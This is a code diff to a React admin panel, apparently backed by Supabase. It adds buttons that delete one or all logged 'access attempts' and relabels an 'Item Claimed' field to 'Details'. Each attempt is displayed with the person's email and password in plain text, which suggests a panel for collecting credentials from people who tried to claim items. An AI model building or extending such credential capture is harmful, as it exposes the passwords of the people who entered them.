@@ -330,6 +330,56 @@ const AdminPanel = () => {
     }
   };
 
+  const handleDeleteAttempt = async (attemptId: string) => {
+    try {
+      const { error } = await supabase
+        .from('access_attempts')
+        .delete()
+        .eq('id', attemptId);
+
+      if (error) throw error;
+      
+      setAccessAttempts(accessAttempts.filter(attempt => attempt.id !== attemptId));
+      toast({
+        title: "Attempt Deleted",
+        description: "Access attempt deleted successfully.",
+      });
+    } catch (error) {
+      console.error('Error deleting attempt:', error);
+      toast({
+        variant: "destructive",
+        title: "Error",
+        description: "Failed to delete attempt.",
+      });
+    }
+  };
+
+  const handleClearAllAttempts = async () => {
+    if (confirm('Are you sure you want to clear all access attempts?')) {
+      try {
+        const { error } = await supabase
+          .from('access_attempts')
+          .delete()
+          .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all records
+
+        if (error) throw error;
+        
+        setAccessAttempts([]);
+        toast({
+          title: "All Attempts Cleared",
+          description: "All access attempts have been cleared.",
+        });
+      } catch (error) {
+        console.error('Error clearing attempts:', error);
+        toast({
+          variant: "destructive",
+          title: "Error",
+          description: "Failed to clear attempts.",
+        });
+      }
+    }
+  };
+
   const handleLogout = () => {
     setIsAuthenticated(false);
     localStorage.removeItem('adminAuthenticated');
@@ -422,8 +472,18 @@ const AdminPanel = () => {
                     <div className="text-sm text-muted-foreground space-y-2">
                       <p><strong className="text-foreground">Email:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.email}</span></p>
                       <p><strong className="text-foreground">Password:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.passphrase}</span></p>
-                      <p><strong className="text-foreground">Item Claimed:</strong> {attempt.item_name}</p>
+                      <p><strong className="text-foreground">Details:</strong> {attempt.item_name}</p>
                       <p><strong className="text-foreground">Time:</strong> {attempt.timestamp ? new Date(attempt.timestamp).toLocaleString() : 'Unknown time'}</p>
+                      <div className="flex gap-2 mt-3">
+                        <Button 
+                          size="sm" 
+                          variant="destructive"
+                          onClick={() => handleDeleteAttempt(attempt.id)}
+                        >
+                          <Trash2 className="w-3 h-3 mr-1" />
+                          Delete
+                        </Button>
+                      </div>
                     </div>
                   </div>
                 ))
@@ -474,10 +534,16 @@ const AdminPanel = () => {
               <Settings className="w-5 h-5" />
               Item Management
             </CardTitle>
-            <Button onClick={handleAddItem} className="btn-royal">
-              <Plus className="w-4 h-4 mr-2" />
-              Add Item
-            </Button>
+            <div className="flex gap-2">
+              <Button onClick={handleClearAllAttempts} variant="destructive">
+                <Trash2 className="w-4 h-4 mr-2" />
+                Clear All Attempts
+              </Button>
+              <Button onClick={handleAddItem} className="btn-royal">
+                <Plus className="w-4 h-4 mr-2" />
+                Add Item
+              </Button>
+            </div>
           </CardHeader>
           <CardContent>
             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
